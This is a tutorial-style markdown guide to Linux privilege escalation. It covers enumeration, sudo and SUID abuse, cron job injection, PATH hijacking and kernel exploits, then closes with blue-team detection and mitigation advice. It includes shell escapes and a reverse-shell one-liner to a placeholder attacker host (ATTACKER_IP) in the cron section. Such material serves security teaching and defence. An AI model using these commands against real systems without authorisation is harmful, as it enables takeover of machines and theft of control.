# Linux Privilege Escalation

Privilege Escalation in Linux refers to the process of gaining higher-level permissions on a system after initial access has been obtained.

Attackers commonly start with a low-privileged user and attempt to escalate privileges to root in order to fully control the system.

---

## 1. Initial Enumeration

Before attempting any escalation technique, proper enumeration is essential.

### Basic System Information

```bash
whoami
id
hostname
uname -a
cat /etc/os-releases
```
These commands help identify:
Current user privileges
Kernel version
Linux distribution
Potentially vulnerable system versions


2. Checking Sudo Permissions

One of the most common privilege escalation paths.

```
sudo -l
```

This command lists what commands the current user is allowed to execute with sudo.

Example Scenario:
If the user can run a binary with sudo without a password, it may allow privilege escalation.

Example:

```
sudo vim
```
Inside vim:

```
:!bash
```
Result → Root shell

3. SUID Binaries

Files with the SUID bit set run with the permissions of the file owner (often root).

Attackers search for unusual SUID binaries.

```
find / -perm -4000 -type f 2>/dev/null
```
Dangerous Scenario

If a vulnerable binary is found with SUID enabled, it may allow root execution.

Example binary:

```
/usr/bin/find
```
Potential abuse:

```
find . -exec /bin/sh \; -quit
```
4. Writable Files and Directories

Attackers check for writable system files and directories.

```
find / -writable -type d 2>/dev/null
```
Misconfigured permissions can allow:
Script modification
Cron job abuse
Binary replacement
Configuration tampering

5. Cron Jobs

Cron jobs executed by root may be exploitable if they run writable scripts.

Check cron jobs:

```
cat /etc/crontab
ls -la /etc/cron*
```
Example Attack Concept

If a script executed by root is writable:

backup.sh

An attacker could inject:

```
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```
Result → Reverse shell as root.

6. PATH Abuse

If a program runs a command without specifying the full path, attackers may hijack the PATH variable.

Example program execution:

```
system("backup");
```
Attacker creates a malicious binary:
```
echo "/bin/bash" > backup
chmod +x backup
export PATH=.:$PATH
```
When the program runs → attacker gains a shell.

7. Kernel Exploits

Older kernels may contain privilege escalation vulnerabilities.

Check kernel version:
```
uname -a
```
Then search for known exploits.

Useful tools:

Linux Exploit Suggester

LinPEAS

Detection Perspective (Blue Team)

Security teams should monitor:

Unusual sudo executions
Newly created SUID binaries
Suspicious cron job modifications
Privilege escalation attempts in logs
Unexpected root shells

Useful logs:
```
/var/log/auth.log
journalctl
```
Mitigation Strategies

To reduce the risk of privilege escalation:

Apply regular security patches
Restrict sudo privileges
Monitor SUID binaries
Audit cron jobs
Enforce the principle of least privilege
Use endpoint detection systems (EDR)

Conclusion

Privilege escalation is one of the most critical phases in post-exploitation.

Proper system hardening, monitoring, and auditing can significantly reduce the risk of attackers gaining root access.
